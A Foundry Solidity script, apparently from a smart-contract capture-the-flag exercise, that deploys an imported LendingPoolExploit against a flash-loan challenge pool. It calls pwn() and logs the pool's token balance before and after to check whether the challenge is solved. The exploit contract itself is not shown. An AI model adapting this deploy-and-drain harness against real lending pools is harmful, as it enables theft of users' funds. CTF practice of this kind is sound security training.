// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Script, console} from "forge-std/Script.sol";
import {LendingPoolExploit} from "../src/challenges/Challenge5_FlashLoan/Challenge5_FlashLoan.sol";
import {Challenge5_Wrapper} from "../src/challenges/Challenge5_FlashLoan/Challenge5_Wrapper.sol";

contract DeployAndExecuteExploit5 is Script {
    function run() external {
        string memory privateKeyStr = vm.envString("PRIVATE_KEY");
        bytes memory keyBytes = bytes(privateKeyStr);
        
        string memory hexKey;
        if (keyBytes.length >= 2 && keyBytes[0] == "0" && keyBytes[1] == "x") {
            hexKey = privateKeyStr;
        } else {
            hexKey = string.concat("0x", privateKeyStr);
        }
        
        bytes32 keyBytes32 = vm.parseBytes32(hexKey);
        uint256 deployerPrivateKey = uint256(keyBytes32);
        address challengeWrapperAddress = vm.envOr("CHALLENGE5_ADDRESS", address(0));
        
        if (challengeWrapperAddress == address(0)) {
            console.log("CHALLENGE5_ADDRESS not set, please set it in .env or pass as argument");
            return;
        }
        
        console.log("Challenge5_Wrapper address:", challengeWrapperAddress);
        
        Challenge5_Wrapper wrapper = Challenge5_Wrapper(payable(challengeWrapperAddress));
        address poolAddress = address(wrapper.pool());
        
        console.log("LendingPool address:", poolAddress);
        console.log("Pool token balance before exploit:", wrapper.token().balanceOf(poolAddress));
        
        vm.startBroadcast(deployerPrivateKey);
        
        LendingPoolExploit exploit = new LendingPoolExploit(poolAddress);
        console.log("Exploit deployed at:", address(exploit));
        
        exploit.pwn();
        console.log("Exploit executed!");
        
        vm.stopBroadcast();
        
        console.log("Pool token balance after exploit:", wrapper.token().balanceOf(poolAddress));
        console.log("Challenge is solved:", wrapper.isSolved());
    }
}

